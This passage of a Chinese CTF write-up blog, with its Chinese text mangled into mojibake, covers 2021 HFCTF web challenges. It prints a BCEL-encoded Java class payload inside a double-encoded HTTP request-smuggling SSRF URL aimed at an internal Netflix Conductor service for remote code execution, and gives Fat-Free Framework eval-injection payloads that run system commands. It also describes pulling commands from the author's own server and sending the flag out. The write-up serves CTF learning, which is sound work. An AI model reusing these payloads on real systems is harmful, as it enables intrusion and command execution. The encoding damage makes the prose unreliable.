$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$EDP$f0$85$ba$Q4$b1$hw$g7FW$f8$88$Y$5d$b8q$a8$T$i$a5$z$v$D$d1$_r$cdF$8d$L$3f$c0$8fR$ef4FLt$9293$f7$dcs$cf$9d$c7$fb$c7$eb$h$80$z$ac$daHc$daF$J$e54f$f4$3ak$a1b$p$89$aa$859$L$f3$M$a9$j$ZH$b5$cb$90$a87$ce$Z$cc$bd$f0Z0$e4$9a2$QG$D$bf$z$a23$de$ee$S$93m$v$ee$dd$j$f2$5e$i$c7$d5$V$92$fb$5c$G$M$e5$fae$f3$96$P$b9$db$e5A$c7m$a9H$G$9dmmg$b7$c2A$e4$89$D$a9$z2$fbC$d9$dd$d4$3a$H$Z$d8$W$W$i$yb$89$n$df$bf$a9$b9$ca$ef$b9$be$e4$a1$K$83$H$H5$y3$U$c7$9e$fb$f7$9e$e8$v$Z$G$OV$60Sc$edE$95c$c5q$fbVx$8a$a10$a6N$H$81$92$3eu$b6$3bB$fd$E$a5z$a3$f9G$b3M$96$e2$5ex$Mk$f5$7f$ae$f2$8b$3a$89BO$f4$fbT$90$ebQR$c5$efr$WqO$60$Z$W$bd$b7$k$G$98$be$o$e1$EEW$U$h$b4$96$d7$9f$c1$5e$60L$r$9e$60$5e$3c$o$dd$dcxBjD$w$TY$e4$e9$5b$M8$a4$ab$oE$98$m6I$7c$862$W$K$e4$5c$o$c7$ye$f20$3e$J$98$85I$N93$d6$U$be$bbUh2$3dG$f1F$h$a6b$oK8$V$l$ae$f8$F$bat$9bh$o$C$A$A URL: http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.64.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1408%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$EDP$f0$85$ba$Q4$b1$hw$g7FW$f8$88$Y$5d$b8q$a8$T$i$a5$z$v$D$d1$_r$cdF$8d$L$3f$c0$8fR$ef4FLt$9293$f7$dcs$cf$9d$c7$fb$c7$eb$h$80$z$ac$daHc$daF$J$e54f$f4$3ak$a1b$p$89$aa$859$L$f3$M$a9$j$ZH$b5$cb$90$a87$ce$Z$cc$bd$f0Z0$e4$9a2$QG$D$bf$z$a23$de$ee$S$93m$v$ee$dd$j$f2$5e$i$c7$d5$V$92$fb$5c$G$M$e5$fae$f3$96$P$b9$db$e5A$c7m$a9H$G$9dmmg$b7$c2A$e4$89$D$a9$z2$fbC$d9$dd$d4$3a$H$Z$d8$W$W$i$yb$89$n$df$bf$a9$b9$ca$ef$b9$be$e4$a1$K$83$H$H5$y3$U$c7$9e$fb$f7$9e$e8$v$Z$G$OV$60Sc$edE$95c$c5q$fbVx$8a$a10$a6N$H$81$92$3eu$b6$3bB$fd$E$a5z$a3$f9G$b3M$96$e2$5ex$Mk$f5$7f$ae$f2$8b$3a$89BO$f4$fbT$90$ebQR$c5$efr$WqO$60$Z$W$bd$b7$k$G$98$be$o$e1$EEW$U$h$b4$96$d7$9f$c1$5e$60L$r$9e$60$5e$3c$o$dd$dcxBjD$w$TY$e4$e9$5b$M8$a4$ab$oE$98$m6I$7c$862$W$K$e4$5c$o$c7$ye$f20$3e$J$98$85I$N93$d6$U$be$bbUh2$3dG$f1F$h$a6b$oK8$V$l$ae$f8$F$bat$9bh$o$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private Step 07 å¼€æ‰“æ‹¿ flagé¦–å…ˆå…ˆè¯•è¯•æ‰“åˆ°è‡ªå·± VPSï¼Œç›‘å¬ä¸€ä¸‹ç«¯å£çœ‹çœ‹å‘ç»™ conductor é¶æœºçš„è¯·æ±‚é•¿ä»€ä¹ˆæ ·ã€‚ å¾ˆå¥½ï¼ŒPOST è¯·æ±‚æ„é€ å¾—å¾ˆå¥½ã€‚ ç„¶å æ‰“ç»™é¶æœºã€‚ ä¾æ¬¡æ‰§è¡Œ Step 06 ä¸­ç”Ÿæˆçš„ä¸¤ä¸ª URLï¼Œåˆ©ç”¨ SSRF æ‰“åˆ° Conductor ä¸Šã€‚ æœ€åæ‰§è¡Œå†™å…¥ /tmp/miaotony çš„è„šæœ¬ï¼Œä»è€Œæ‰§è¡Œ VPS ä¸Šè®¾ç½®çš„å‘½ä»¤ï¼Œå†ä»è·¯ç”±æ‹¿ flagã€‚ flag{81d75716-7389-4ea0-8e48-ff50347a37c2} å¥½è€¶ï¼ å¿ƒæ€ç‚¸äº†ï¼Œé¡ºä¾¿çœ‹äº†çœ‹å®ƒçš„ /bin å’Œ /sbin é‡Œæœ‰å•¥ã€‚ total 780 lrwxrwxrwx 1 root root 12 May 9 2019 arch -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ash -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 base64 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 bbconfig -&gt; /bin/busybox -rwxr-xr-x 1 root root 796240 Jan 24 2019 busybox lrwxrwxrwx 1 root root 12 May 9 2019 cat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 chgrp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 chmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 chown -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 conspy -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 cp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 date -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 df -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dmesg -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dnsdomainname -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 dumpkmap -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 echo -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ed -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 egrep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 false -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fatattr -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fdflush -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fgrep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fsync -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 getopt -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 grep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 gunzip -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 gzip -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 hostname -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ionice -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iostat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ipcalc -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 kbd_mode -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 kill -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 link -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 linux32 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 linux64 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ln -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 login -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ls -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 lzop -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 makemime -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mkdir -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mknod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mktemp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 more -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mount -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mountpoint -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mpstat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mv -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 netstat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 nice -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 pidof -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ping -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ping6 -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 pipe_progress -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 printenv -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ps -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 pwd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 reformime -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rev -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rm -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rmdir -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 run-parts -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sed -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 setpriv -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 setserial -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sh -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sleep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 stat -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 stty -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 su -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sync -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 tar -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 touch -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 true -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 umount -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 uname -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 usleep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 watch -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 zcat -&gt; /bin/busybox total 228 lrwxrwxrwx 1 root root 12 May 9 2019 acpid -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 adjtimex -&gt; /bin/busybox -rwxr-xr-x 1 root root 211304 Jan 10 2019 apk lrwxrwxrwx 1 root root 12 May 9 2019 arp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 blkid -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 blockdev -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 depmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fbsplash -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fdisk -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 findfs -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fsck -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fstrim -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 getty -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 halt -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 hdparm -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 hwclock -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifconfig -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifdown -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifenslave -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifup -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 init -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 inotifyd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 insmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ip -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ipaddr -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iplink -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ipneigh -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iproute -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iprule -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iptunnel -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 klogd -&gt; /bin/busybox -rwxr-xr-x 1 root root 393 Mar 19 2019 ldconfig lrwxrwxrwx 1 root root 12 May 9 2019 loadkmap -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 logread -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 losetup -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 lsmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mdev -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mkdosfs -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mkfs.vfat -&gt; /bin/busybox -rwxr-xr-x 1 root root 13968 Jan 23 2019 mkmntdirs lrwxrwxrwx 1 root root 12 May 9 2019 mkswap -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 modinfo -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 modprobe -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 nameif -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 nologin -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 poweroff -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 raidautorun -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 reboot -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rmmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 route -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 setconsole -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 slattach -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 swapoff -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 swapon -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 switch_root -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sysctl -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 syslogd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 tunctl -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 udhcpc -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 vconfig -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 watchdog -&gt; /bin/busybox å™¢ï¼Œæœç„¶æ²¡æœ‰ bash, nc, python, perl, etc. è¿™äº›ï¼Œç¡®å®ä¸æ€ä¹ˆæ–¹ä¾¿åå¼¹ shellâ€¦â€¦ ls /etc/*-release çœ‹çœ‹æ˜¯å•¥å‘è¡Œç‰ˆ 3.9.4 NAME=\"Alpine Linux\" ID=alpine VERSION_ID=3.9.4 PRETTY_NAME=\"Alpine Linux v3.9\" HOME_URL=\"https://alpinelinux.org/\" BUG_REPORT_URL=\"https://bugs.alpinelinux.org/\" Alpine Linux æ–‡æ˜ï¼ˆ å°ç»“å•Šå•Šå•Šå•Šå•Šï¼ ç»ˆäºå¤ç°å®Œäº†ï¼ï¼ è¿™é¢˜å¤ªé¡¶äº†ï¼ï¼ï¼ å†æ¥å›é¡¾ä»¥ä¸‹æ€è·¯ï¼š æ ¹æ® /source å®¡è®¡æºç  åˆ©ç”¨ JavaScript å¼±ç±»å‹ç‰¹æ€§ï¼Œç»•è¿‡ç™»å½•éªŒè¯è·å¾— admin æƒé™ åˆ©ç”¨ 0.0.0.0ï¼Œé€šè¿‡ /proxy å’Œ /search æ¥å£ç»• WAFï¼Œè®¿é—® /flag æ‹¿ hint åœ¨ docker å†…ç½‘æ‰¾ Netflix Conductor æœåŠ¡ æ‰¾ Netflix Conductor æ¼æ´ï¼Œåˆ©ç”¨ä¸€ä¸ª 1day RCE æ„é€  payload åˆ©ç”¨ NodeJS 8 çš„ HTTP è¯·æ±‚èµ°ç§ / è¯·æ±‚æ‹†åˆ†æ¼æ´ï¼Œé€šè¿‡ GET æ–¹æ³•èµ°ç§ POST è¯·æ±‚ åˆ©ç”¨ /proxy SSRF ç»™å†…ç½‘çš„ Netflix Conductor æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼ŒæŠŠ flag æ‰“åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šã€‚ è¿™é¢˜å †çš„è€ƒç‚¹æœ‰äº¿ç‚¹ç‚¹å¤šï¼Œæ„Ÿè§‰æ”¾åœ¨ 8h çš„æ¯”èµ›é‡Œæ—¶é—´ç¡®å®ä¸å¤§å¤Ÿã€‚ è™½ç„¶ç»™å¤Ÿæ—¶é—´ä¹Ÿå¾ˆéš¾åšå‡ºæ¥å°±æ˜¯äº†ï¼ˆå–µå–µè‡ªå·±çˆ¬äº† ä¸è¿‡æ€ä¹ˆè¯´ï¼Œå¤ç°è¿™é¢˜çš„è¿‡ç¨‹ä¸­ç¡®å®å­¦åˆ°äº†è®¸å¤šâ€¦â€¦ å¥½ä¹…æ²¡åšè¿™ä¹ˆé¡¶çš„é¢˜ç›®äº†ï¼ˆ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/04/05/CTF_2021HFCTF_internal_system/"},{"title":"CTF | 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ WriteUp","text":"å¼•è¨€ 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ 2021å¹´4æœˆ3æ—¥ 10:00-18:00 https://www.ichunqiu.com/2021hfctf è²Œä¼¼æœ‰ä¸€æ®µæ—¶é—´æ²¡æ¥æ‰“ CTF äº†ï¼Œæ‰‹æœ‰ç‚¹ç”Ÿäº†ã€‚ ä»Šå¹´çš„è™ç¬¦æ¥çš„æœ‰ç‚¹æ—©ï¼Œè¿˜èµ¶ä¸Šäº†æ¸…æ˜å‡æœŸï¼Œå¤§å®¶éƒ½æ¯”è¾ƒå¿™ï¼Œå°±æ¥éšæ„çœ‹çœ‹é¢˜å¥½äº†å§ï¼ˆ Webç­¾åˆ° å¸ˆå‚…ä»¬å¸¸è¯´ï¼Œè¦å–„äºå­¦ä¹ ï¼Œç»†è‡´å…¥å¾®ï¼›å¸ˆå‚…ä»¬ä¹Ÿå¸¸è¯´ï¼Œè¦å–„äºåˆ†äº«ï¼Œæ€»ç»“å½’çº³ã€‚ 2021å¹´3æœˆ28æ—¥ï¼ŒPHPç»´æŠ¤çš„å®˜æ–¹GitæœåŠ¡å™¨ git.php.net è¢«è¢­å‡»ï¼Œå…¶Gitä»“åº“é­åˆ°æ¶æ„ç¯¡æ”¹ã€‚å¦‚æœå¼€å‘è€…ä½¿ç”¨è¿™äº›é­åˆ°ç¯¡æ”¹çš„æºä»£ç è¿›è¡Œç½‘é¡µçš„å¼€å‘çš„è¯ï¼Œç½‘ç«™å°±ä¼šåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¢«æ„ŸæŸ“ã€‚ å‚è€ƒæ–°é—» PHPçš„GitæœåŠ¡å™¨è¢«å…¥ä¾µï¼Œæºä»£ç è¢«æ·»åŠ åé—¨ PHP å®˜æ–¹ï¼šChanges to Git commit workflow https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d æˆ–è€… http://git.php.net/?p=php-src.git;a=blobdiff;f=ext/zlib/zlib.c;h=6964407837cb073cd04e8db9d2b2b0e4ccd8faf8;hp=02fb4dd207a29bb2e3f1fefb1cac5e0fab5ca146;hb=c730aa26bd52829a49f2ad284b181b7e82a68d7d;hpb=92aeda524b0b99ab0c861bcba62e5a471ba805e6 ç›´æ¥åœ¨ header æ‰“å°±å¥½äº†ã€‚æ³¨æ„æ˜¯ä¸¤ä¸ªtã€‚ unsetme æ˜¯ç¼ºé™·è¿˜æ˜¯æ¼æ´å‘¢ã€‚ &lt;?php // Kickstart the framework $f3=require('lib/base.php'); $f3-&gt;set('DEBUG',1); if ((float)PCRE_VERSION&lt;8.0) trigger_error('PCRE version is out of date'); // Load configuration highlight_file(__FILE__); $a=$_GET['a']; unset($f3-&gt;$a); $f3-&gt;run(); æ˜¯ Fat-Free Framework ï¼Œä¸€æŸ¥å‘ç° 3.7.1 ç‰ˆæœ¬å­˜åœ¨ RCE æ¼æ´ CVE-2020-5203ã€‚ ä½†è¿™ä¸ªæ¼æ´åœ¨ 3.7.2 ä¿®å¤äº†ã€‚ æ ¹æ® /lib/CHANGELOG.mdï¼Œå¾—çŸ¥é¢˜ç›®ç”¨åˆ°çš„ç‰ˆæœ¬æ˜¯ 3.7.2 (28 May 2020) æŸ¥çœ‹æºç ï¼Œå½“å¯¹ä¸å¯è®¿é—®çš„å±æ€§è°ƒç”¨ unset() æ—¶__unset()ä¼šè¢«è°ƒç”¨ã€‚ åœ¨ clear é‡Œæœ‰ evalï¼Œæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œä½†éœ€è¦æœ‰ $parts[1] if (!isset($parts[1]) &amp;&amp; array_key_exists($parts[0],$this-&gt;init)) // Reset global to default value $this-&gt;hive[$parts[0]]=$this-&gt;init[$parts[0]]; else { $val=preg_replace('/^(\\$hive)/','$this-&gt;hive', $this-&gt;compile('@hive.'.$key, FALSE)); eval('unset('.$val.');'); if ($parts[0]=='SESSION') { session_commit(); session_start(); } if ($cache-&gt;exists($hash=$this-&gt;hash($key).'.var')) // Remove from cache $cache-&gt;clear($hash); } å†çœ‹ changelog æ ¹æ® https://github.com/bcosca/fatfree/issues/1206 https://github.com/bcosca/fatfree/issues/1191 æ­£åˆ™åŒ¹é…å¯¹ [] å¤„ç†ä¸å½“ï¼Œäºæ˜¯æ„é€  payload /?a=SESSION[f3-reroute-info]);phpinfo( /?a=SESSION[f3-reroute-info]);system('ls /' /?a=SESSION[f3-reroute-info]);system('cat /flag' flag{dfc91022-dc9d-481a-8b46-cff1ce6e51be} internal_system å¼€å‘äº†ä¸€ä¸ªå…¬å¸å†…éƒ¨çš„è¯·æ±‚ä»£ç†ç½‘ç«™ï¼Œå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä½†æ¥ä¸åŠäº†è¿˜æ˜¯å…ˆä¸Šçº¿å§ï¼ˆâ”€.â”€||ï¼‰ http://8.140.152.226:47921/ hint: /sourceå­˜åœ¨æºç æ³„éœ²ï¼›/proxyå­˜åœ¨ssrf ï¼ˆè¿™æ˜¯ä¸€é“é›¶è§£çš„é¢˜ç›®â€¦â€¦ è®¿é—® /source å¾—åˆ°æºç ï¼Œå•Šæ˜¯ NodeJSã€‚ const express = require('express') const router = express.Router() const axios = require('axios') const isIp = require('is-ip') const IP = require('ip') const UrlParse = require('url-parse') const {sha256, hint} = require('./utils') const salt = 'nooooooooodejssssssssss8_issssss_beeeeest' const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin')) const port = process.env.PORT || 3000 function formatResopnse(response) { if(typeof(response) !== typeof('')) { return JSON.stringify(response) } else { return response } } function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host) } function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag') } function OTHER_WAF(url) { return true; } const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get('/', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.redirect('/index') } }) router.get('/login', (req, res, next) =&gt; { const {username, password} = req.query; if(!username || !password || username === password || username.length === password.length || username === 'admin') { res.render('login') } else { const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect('/index') } }) router.get('/index', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.render('index', {admin: req.session.admin}) } }) router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: \"Here is the waf...\"}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } } }) router.post('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } // test url // not implemented here const url = \"https://postman-echo.com/post\" await axios.post(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', \"Something needs to be implemented\") }) router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result) }) router.get('/source', (req, res, next)=&gt;{ res.sendFile( __dirname + \"/\" + \"route.js\"); }) router.get('/flag', (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'No Flag For You!'}) } return res.json({hint: hint}) }) module.exports = router é¦–å…ˆéœ€è¦ç™»å½•ï¼Œè¿™é‡Œç”¨åˆ°äº† JavaScript å¼±ç±»å‹çš„ç‰¹æ€§ã€‚ å‚è€ƒ SuSeC CTF 2020 Writeup &amp; åŸºäºNode.JSçš„sha1ç»•è¿‡åˆ†æ 